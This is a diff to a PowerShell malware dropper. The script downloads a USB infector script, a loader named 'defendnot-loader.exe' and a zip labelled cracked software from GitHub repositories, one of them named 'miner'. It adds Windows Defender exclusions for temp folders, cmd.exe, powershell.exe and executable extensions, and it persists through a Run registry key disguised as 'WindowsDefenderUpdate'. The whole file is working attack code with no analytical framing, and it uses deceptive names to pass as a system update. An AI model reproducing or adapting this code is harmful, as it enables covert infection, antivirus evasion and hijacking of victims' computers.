@@ -5,11 +5,10 @@ Start-Sleep -Seconds 15
 $monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/defendnot-loader.exe"
-$payloadPath = "C:\Windows\Temp\svchost_defender_update.exe"
-$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
-$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
-$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
-$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
+$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore_x64.zip"
+$crackedSoftwareZipPath = "C:\Windows\Temp\update_package_x64.zip"
+$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices_x64"
+$payloadPath = "$crackedSoftwareFolder\defendnot-loader.exe"
 
 function Is-Admin {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -33,9 +32,8 @@ for ($i = 0; $i -lt $maxAttempts; $i++) {
 
 $exclusionsPaths = @(
     "C:\Users\Public\SystemLib",
-    "C:\Windows\Temp\svchost_defender_update.exe",
-    "C:\Windows\Temp\WindowsServices",
-    "C:\Windows\Temp\update_package.zip",
+    "$crackedSoftwareFolder",
+    "$crackedSoftwareZipPath",
     "C:\ProgramData\WinKit",
     "C:\Windows\Temp\*",
     "C:\ProgramData\Microsoft\Windows\Temp",
@@ -50,11 +48,10 @@ $exclusionsPaths = @(
     $monitorScriptPath
 )
 $exclusionsProcesses = @(
-    "svchost_defender_update.exe",
+    "defendnot-loader.exe",
     "ServiceHost.exe",
     "cmd.exe",
-    "powershell.exe",
-    "defendnot-loader.exe"
+    "powershell.exe"
 )
 $exclusionsExtensions = @(
     "exe",
@@ -123,21 +120,6 @@ if (-not (Test-Path -Path $monitorScriptPath)) {
     }
 }
 
-if (-not (Test-Path -Path $payloadPath)) {
-    for ($i = 0; $i -lt $retryCount; $i++) {
-        try {
-            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-            if (-not (Test-Path -Path $payloadPath)) {
-                throw "Downloaded file not found at $payloadPath."
-            }
-            Unblock-File -Path $payloadPath -ErrorAction Stop
-            break
-        } catch {
-            Start-Sleep -Seconds 2
-        }
-    }
-}
-
 if (-not (Test-Path -Path $crackedSoftwareFolder)) {
     for ($i = 0; $i -lt $retryCount; $i++) {
         try {
@@ -146,8 +128,8 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
                 throw "Downloaded zip file not found at $crackedSoftwareZipPath."
             }
             Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-            if (-not (Test-Path -Path $crackedSoftwareExe)) {
-                throw "Update executable missing."
+            if (-not (Test-Path -Path $payloadPath)) {
+                throw "Payload executable missing."
             }
             Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
             break
@@ -169,7 +151,7 @@ if (Test-Path -Path $payloadPath) {
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     $regName = "WindowsDefenderUpdate"
-    $command = "C:\Windows\Temp\svchost_defender_update.exe"
+    $command = "$crackedSoftwareFolder\defendnot-loader.exe"
     $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
     if ($regExists -and $regExists.WindowsDefenderUpdate -eq $command) {
     } else {
@@ -217,3 +199,5 @@ try {
     }
 } catch {
 }
+
+Write-Host "Setup completed successfully."
